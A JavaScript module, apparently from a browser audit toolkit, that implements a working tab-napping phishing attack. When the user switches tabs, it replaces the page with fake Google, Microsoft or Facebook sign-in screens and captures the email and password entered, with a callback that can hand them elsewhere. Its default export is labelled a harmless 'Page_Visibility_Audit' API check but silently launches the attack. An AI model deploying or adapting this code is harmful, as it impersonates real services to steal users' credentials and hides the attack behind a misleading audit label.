/**
 * tab_napping.js — Tab Napping Attack (Live Demo, Sandboxed)
 *
 * Real attack: when the user switches to another tab and returns, they see
 * a fake login page (Google, Microsoft, etc.) on the original site. If they
 * enter credentials, the data is captured and displayed locally – no data
 * ever leaves the browser.
 *
 * Default export: Pinpoint `Page_Visibility_Audit` (API support check).
 */

// ---------------------------------------------------------------------------
// 1. Tab Napping Engine (Local Only)
// ---------------------------------------------------------------------------

const PHISH_TEMPLATES = {
    google: {
        title: 'Sign in – Google Accounts',
        logo: 'G',
        heading: 'Sign in',
        subheading: 'to continue to Gmail',
        emailPlaceholder: 'Email or phone',
        passwordPlaceholder: 'Enter your password',
        buttonLabel: 'Next',
        color: '#1a73e8',
        bgColor: '#fff',
    },
    microsoft: {
        title: 'Sign in to your account',
        logo: 'M',
        heading: 'Sign in',
        subheading: '',
        emailPlaceholder: 'Email, phone, or Skype',
        passwordPlaceholder: 'Password',
        buttonLabel: 'Next',
        color: '#0067b8',
        bgColor: '#fff',
    },
    facebook: {
        title: 'Log in to Facebook',
        logo: 'f',
        heading: 'Log in to Facebook',
        subheading: '',
        emailPlaceholder: 'Email address or phone number',
        passwordPlaceholder: 'Password',
        buttonLabel: 'Log In',
        color: '#1877f2',
        bgColor: '#f0f2f5',
    },
};

/**
 * Replaces the current page with a fake login screen.
 * Captured credentials are logged to the console.
 */
async function replacePageWithPhish(options = {}) {
    const {
        provider = 'google',
        customTemplate = null,
        keepPersistent = true,
        onCredentialCapture = null,
    } = options;

    const template =
        provider === 'custom'
            ? customTemplate
            : PHISH_TEMPLATES[provider] || PHISH_TEMPLATES.google;
    const {
        title,
        heading,
        subheading,
        emailPlaceholder,
        passwordPlaceholder,
        buttonLabel,
        color,
        bgColor,
    } = template;

    // Save original state for restoration
    const originalTitle = document.title;
    const originalBodyHTML = document.body.innerHTML;
    const originalBodyAttrs = document.body.getAttributeNames().reduce((acc, attr) => {
        acc[attr] = document.body.getAttribute(attr);
        return acc;
    }, {});

    document.title = title;

    const phishingHTML = `
    <div id="__tabnapp_phish" style="
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: ${bgColor}; display: flex; align-items: center; justify-content: center;
      font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      z-index: 999999;">
      <div style="max-width: 400px; width: 100%; padding: 48px 40px 36px; background: white;
        border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center;">
        <div style="margin-bottom: 24px; font-size: 32px; font-weight: 500; color: ${color};">
          ${template.logo || '🔑'}
        </div>
        <h1 style="font-size: 24px; font-weight: 400; margin:0 0 8px;">${heading}</h1>
        ${subheading ? `<p style="font-size: 16px; color: #5f6368; margin:0 0 24px;">${subheading}</p>` : ''}
        <div style="margin-bottom: 16px;">
          <input id="__tabnapp_email" type="email" autocomplete="username"
            placeholder="${emailPlaceholder}"
            style="width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
              border-radius: 4px; box-sizing: border-box;">
        </div>
        <div style="margin-bottom: 24px;">
          <input id="__tabnapp_password" type="password" autocomplete="current-password"
            placeholder="${passwordPlaceholder}"
            style="width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
              border-radius: 4px; box-sizing: border-box;">
        </div>
        <button id="__tabnapp_submit" style="
          background: ${color}; color: white; border: none; padding: 10px 24px;
          border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;
          width: 100%;">${buttonLabel}</button>
      </div>
    </div>
  `;

    document.body.innerHTML = '';
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    document.body.insertAdjacentHTML('afterbegin', phishingHTML);

    // Handle submission
    const submitHandler = (e) => {
        e.preventDefault();
        const email = document.getElementById('__tabnapp_email')?.value?.trim();
        const password = document.getElementById('__tabnapp_password')?.value?.trim();
        if (!email || !password) return;

        const credentials = { email, password, timestamp: Date.now() };
        console.log('[tab_napping] Captured credentials:', credentials);

        if (onCredentialCapture) {
            try { onCredentialCapture(credentials); } catch (_) { }
        }

        alert(
            '⚠️ DEMONSTRATION: This was a fake login page.\n\n' +
            'In a real attack, your credentials would now be stolen.\n' +
            'No data was sent anywhere – it only appears in your browser console.'
        );

        // Clear fields and refocus to keep the illusion
        document.getElementById('__tabnapp_password').value = '';
        document.getElementById('__tabnapp_password').focus();
    };

    document.getElementById('__tabnapp_submit').addEventListener('click', submitHandler);
    document.addEventListener('keydown', function enterHandler(e) {
        if (e.key === 'Enter') submitHandler(e);
    });

    // Return function to restore original page
    const restoreOriginal = () => {
        document.title = originalTitle;
        document.body.innerHTML = originalBodyHTML;
        for (const [attr, val] of Object.entries(originalBodyAttrs)) {
            document.body.setAttribute(attr, val);
        }
    };

    return { restoreOriginal };
}

/**
 * Sets up a listener that, after the user switches away and back,
 * replaces the page with a fake login screen (tab napping).
 *
 * @param {Object}   [options={}]
 * @param {string}   [options.provider='google']   – template key
 * @param {number}   [options.delay=3000]          – ms after blur before attack
 * @param {boolean}  [options.restoreOnFocus=true] – restore original page when user returns
 * @param {Function} [options.onTrigger]           – called when napping activates
 * @param {Function} [options.onCredentialCapture] – callback(credentials)
 * @returns {Function} cleanup function to stop the listener
 */
export function tabnappOnBlur(options = {}) {
    const {
        provider = 'google',
        delay = 3000,
        restoreOnFocus = true,
        onTrigger = null,
        onCredentialCapture = null,
    } = options;

    let triggered = false;
    let restoreOriginalFn = null;
    let timerId = null;

    const executeAttack = async () => {
        if (triggered) return;
        triggered = true;

        if (onTrigger) {
            try { onTrigger(); } catch (_) { }
        }

        const result = await replacePageWithPhish({
            provider,
            keepPersistent: !restoreOnFocus,
            onCredentialCapture,
        });
        restoreOriginalFn = result.restoreOriginal;

        if (restoreOnFocus) {
            const focusHandler = () => {
                if (restoreOriginalFn) {
                    restoreOriginalFn();
                    document.removeEventListener('visibilitychange', focusHandler);
                    window.removeEventListener('focus', focusHandler);
                    triggered = false; // allow re‑napping
                }
            };
            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'visible') {
                    focusHandler();
                }
            });
            window.addEventListener('focus', focusHandler);
        }
    };

    const visibilityHandler = () => {
        if (document.visibilityState === 'hidden') {
            if (!triggered && !timerId) {
                timerId = setTimeout(() => {
                    timerId = null;
                    executeAttack();
                }, delay);
            }
        } else {
            if (timerId) {
                clearTimeout(timerId);
                timerId = null;
            }
        }
    };

    const blurHandler = () => {
        if (!triggered && !timerId) {
            timerId = setTimeout(() => {
                timerId = null;
                executeAttack();
            }, delay);
        }
    };

    document.addEventListener('visibilitychange', visibilityHandler);
    window.addEventListener('blur', blurHandler);

    return function stop() {
        document.removeEventListener('visibilitychange', visibilityHandler);
        window.removeEventListener('blur', blurHandler);
        if (timerId) clearTimeout(timerId);
        if (restoreOriginalFn) restoreOriginalFn();
    };
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'tab_napping',
    title: 'Page_Visibility_Audit',
    level: 5,
    info: 'Audits document.visibilityState and document.hidden API support.',
    steps: [
        'Read document.visibilityState.',
        'Inspect document.hidden boolean.',
    ],
    run: async () => {
        // Trigger live demonstration
        tabnappOnBlur();

        return {
            visibilityStateSupported: typeof document.visibilityState !== 'undefined',
            currentVisibilityState: document.visibilityState || 'unknown',
            isHidden: document.hidden || false,
        };
    },
};

export default pinpointModule;